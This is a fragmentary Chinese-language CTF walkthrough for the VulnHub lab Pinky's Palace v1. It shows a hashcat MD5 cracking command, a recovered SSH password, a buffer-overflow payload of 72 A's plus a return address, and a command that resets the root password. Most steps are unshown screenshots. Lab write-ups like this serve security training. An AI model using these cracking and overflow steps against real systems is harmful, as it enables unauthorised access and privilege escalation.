[https://www.vulnhub.com/entry/pinkys-palace-v1,225/](https://www.vulnhub.com/entry/pinkys-palace-v1,225/)
 
参考资料  
[https://d7x.promiselabs.net/2018/03/22/ctf-pinkys-palace-v1-vulnhub-ctf-walkthrough/](https://d7x.promiselabs.net/2018/03/22/ctf-pinkys-palace-v1-vulnhub-ctf-walkthrough/)  
[https://oktoriorizkiprasetya.wordpress.com/2018/12/04/ctf-challenge-pinkys-palace-v1/](https://oktoriorizkiprasetya.wordpress.com/2018/12/04/ctf-challenge-pinkys-palace-v1/)  
[https://blaksec.com/index.php?title=Pinky%27s_Palace:_v1_~_VulnHub_-_Walkthrough](https://blaksec.com/index.php?title=Pinky%27s_Palace:_v1_~_VulnHub_-_Walkthrough)
      

下一步进行hash的破解

![[PINKY'S PALACE V1 image 3a4228e5cc4d5482.png|Exported image]]  

密码爆破：  
hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt  
==用户====pinkymanage== ==的密码 是== ==3pinkysaf33pinkysaf3====尝试使用这些凭据登录== ==Web== ==应用程序不会执行任何操作，但是尝试通过====ssh== ==登录时则不会执行任何操作：==
   
![[PINKY'S PALACE V1 image 142d5ec733ddbf46.png|Exported image]]  

根据提示我们得到当前目录下有一个秘钥文件

![[PINKY'S PALACE V1 image 799fdb3c1b7715bb.png|Exported image]]  
![[PINKY'S PALACE V1 image 00eb350a91bfd61d.png|Exported image]]  
![[PINKY'S PALACE V1 image aac79c68c4f52544.png|Exported image]]  

继续进行

![[PINKY'S PALACE V1 image 3422d4da03bc9535.png|Exported image]]   
使用gdb进行调试

![[PINKY'S PALACE V1 image b3a7a3cccd498ed0.png|Exported image]]   ![[PINKY'S PALACE V1 image e51131c4ce273fd4.png|Exported image]]  
![[PINKY'S PALACE V1 image 566e0154acf4ad38.png|Exported image]]  

使用python打印72个A  
print("A" *72)  
python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\x47\x55\x55\x55\x55'" \>\>output
   
![[PINKY'S PALACE V1 image aa137184c4e7496b.png|Exported image]]   
难点在进行gdb的调试和分析 内存的分类
 
设置root密码  
echo "123" | passwd --stdin root